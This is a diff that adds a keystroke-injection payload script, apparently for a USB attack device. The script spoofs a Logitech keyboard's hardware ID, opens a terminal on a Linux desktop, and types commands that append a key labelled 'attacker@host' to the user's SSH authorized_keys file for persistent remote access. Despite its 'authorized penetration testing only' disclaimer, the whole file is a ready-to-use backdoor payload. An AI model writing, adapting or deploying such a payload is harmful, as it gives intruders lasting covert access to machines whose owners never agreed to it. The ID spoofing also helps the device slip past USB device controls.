@@ -1,0 +1,27 @@
+REM Title: Add SSH Authorized Key (Linux)
+REM Author: Community
+REM Target: Linux desktop
+REM Description: Adds your public SSH key for persistent access
+REM EDIT PUBLIC KEY BEFORE USE
+REM AUTHORIZED PENETRATION TESTING ONLY
+REM
+ID 046D:C31C Logitech USB Keyboard
+
+DELAY 1500
+
+CTRL ALT t
+DELAY 1200
+
+STRING mkdir -p ~/.ssh && chmod 700 ~/.ssh
+ENTER
+DELAY 300
+
+REM CHANGE the public key below to yours
+STRING echo "ssh-rsa AAAA...YOUR_PUBLIC_KEY_HERE... attacker@host" >> ~/.ssh/authorized_keys
+ENTER
+DELAY 300
+STRING chmod 600 ~/.ssh/authorized_keys
+ENTER
+DELAY 300
+STRING echo "SSH key added"
+ENTER
